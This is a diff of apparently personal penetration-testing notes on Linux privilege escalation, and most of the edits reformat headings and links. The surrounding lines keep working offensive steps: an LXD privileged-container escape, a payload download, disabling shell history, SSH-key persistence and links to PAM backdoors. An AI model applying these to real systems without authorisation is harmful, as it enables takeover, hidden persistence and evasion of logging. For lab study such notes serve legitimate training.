@@ -121,7 +121,6 @@ ssh -i _id_rsa [id]@[ip]
 ```
 
 ## Sudo 
-### Sudo -flags
 #### sudo -l
 ```bash
 sudo -l # chedck usage
@@ -320,12 +319,15 @@ LinuxBox:
 /nameofmount/x
 ```
 ## Find lxd and lxc?
-### Enumerate and file transfer an image
+Enumerate and file transfer an image
 ```bash
 lxd version
 lxc image list
 ```
-### 1. import image 2. run image 3. /mnt into box itself 4. start container and run sh
+ 1. import image 
+ 2. 2. run image 
+ 3. 3. /mnt into box itself 
+ 4. 4. start container and run sh
 ```bash
 lxc image import ./alpine*.tar.gz --alias $myimage
 lxc init $myimage $mycontainer -c security.privileged=true
@@ -348,10 +350,12 @@ curl -o badpackage.sh
 unset HISTFILE          disable writing to history file
 ```
 
-####Backdoors required?
-## Reference: https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c
+####  Backdoors required?
+Reference:[airman604](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c)
+
+
 ## ssh
-# It's not very hidden, easy to remove or detect
+It's not very hidden, easy to remove or detect
 ```bash
 ssh-keygen
 #drop public key in /target/.ssh
@@ -412,7 +416,7 @@ OR pam_unix.so [pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
 #### Reference
 # Unless speficied, the reference relates to general Liuux Privilege Escalation:
 
-[9-ways-to-backdoor-a-linux-box(https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c) # Backdoors
+[9-ways-to-backdoor-a-linux-box](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c) # Backdoors
 [creating-backdoor-in-pam](http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html) # pam _unix backdoors
 [linuxbackdoors](https://tryhackme.com/room/linuxbackdoors) # Backdoors
 [linprivesc](https://tryhackme.com/room/linprivesc)
